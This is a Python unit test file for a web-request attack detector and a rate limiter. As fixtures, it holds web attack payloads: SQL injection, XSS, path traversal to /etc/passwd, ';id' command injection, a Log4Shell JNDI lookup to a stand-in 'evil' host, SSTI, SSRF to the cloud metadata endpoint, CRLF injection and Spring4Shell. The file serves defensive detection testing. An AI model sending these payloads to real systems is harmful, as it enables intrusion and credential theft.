"""Fast unit tests for deterministic rules, benign guard and rate limiting."""

import unittest

from src.preprocessing.attack_rules import detect_attack_rules, is_structurally_benign
from src.utils.ratelimit import RateLimiter


class TestAttackRules(unittest.TestCase):
    def test_benign_requests_have_no_rules(self):
        benign = [
            ("GET", "/search?q=smart+watch&cat=electronics", {}, ""),
            ("GET", "/search?q=C%2B%2B+programming", {}, ""),
            ("GET", "/search?q=union+station+band", {}, ""),
            ("GET", "/files?name=report.pdf&size=2048", {}, ""),
            ("GET", "/search?q=how+to+use+sleep()", {}, ""),
            ("GET", "/search?q=document.cookie+explained", {}, ""),
            ("GET", "/api?url=https://api.example.com/v1/users", {}, ""),
            (
                "POST",
                "/form",
                {"Content-Type": "application/x-www-form-urlencoded"},
                "name=John&city=New+York&id=42",
            ),
            (
                "POST",
                "/soap",
                {"Content-Type": "text/xml"},
                '<?xml version="1.0"?><Envelope><Body><GetUser><id>42</id>'
                "</GetUser></Body></Envelope>",
            ),
        ]
        for method, path, headers, body in benign:
            with self.subTest(path=path):
                self.assertEqual(
                    detect_attack_rules(method, path, headers, body), []
                )

    def test_attacks_match_expected_rule(self):
        attacks = [
            ("/?id=1%20UNION%20ALL%20SELECT%20null", "sqli_union"),
            ("/?id=1%20or%201=1", "sqli_boolean"),
            ("/?q=%3Cscript%3Ealert(1)%3C/script%3E", "xss_script_tag"),
            ("/?q=%3Csvg%20onload=alert(1)%3E", "xss_event_handler"),
            ("/?f=../../../../etc/passwd", "path_traversal"),
            ("/?x=;id", "command_injection"),
            ("/?x=${${lower:j}ndi:ldap://evil/a}", "log4shell"),
            ("/?x={{7*7}}", "ssti"),
            ("/?u=http://169.254.169.254/latest/meta-data", "ssrf_internal"),
            ("/?x=%0d%0aLocation:%20http://evil", "crlf_injection"),
            ("/?id=1;waitfor+delay+'0:0:5'", "sqli_time"),
            ("/?x=document.cookie=", "xss_dom_sink"),
        ]
        for path, rule in attacks:
            with self.subTest(path=path):
                self.assertIn(rule, detect_attack_rules("GET", path, {}, ""))

    def test_spring4shell_and_nosql(self):
        self.assertIn(
            "spring4shell",
            detect_attack_rules(
                "POST",
                "/x",
                {"Content-Type": "application/x-www-form-urlencoded"},
                "class.module.classLoader.resources=x",
            ),
        )
        self.assertIn(
            "nosql_operator",
            detect_attack_rules(
                "POST",
                "/x",
                {"Content-Type": "application/json"},
                '{"username":{"$ne":null}}',
            ),
        )

    def test_structural_benign_detection(self):
        self.assertEqual(
            is_structurally_benign("POST", "/login", {"Content-Type": "application/json"}, "{}"),
            "json",
        )
        self.assertEqual(
            is_structurally_benign("GET", "/products", {}, ""),
            "query",
        )
        self.assertIsNone(
            is_structurally_benign("POST", "/x", {}, "<script>alert(1)</script>")
        )


class TestRateLimiter(unittest.IsolatedAsyncioTestCase):
    async def test_local_limit(self):
        limiter = RateLimiter(limit=2, window_seconds=60)
        self.assertEqual((await limiter.allow("1.2.3.4"))[0], True)
        self.assertEqual((await limiter.allow("1.2.3.4"))[0], True)
        self.assertEqual((await limiter.allow("1.2.3.4"))[0], False)
        # A different client is not affected.
        self.assertEqual((await limiter.allow("5.6.7.8"))[0], True)
        await limiter.close()


if __name__ == "__main__":
    unittest.main()
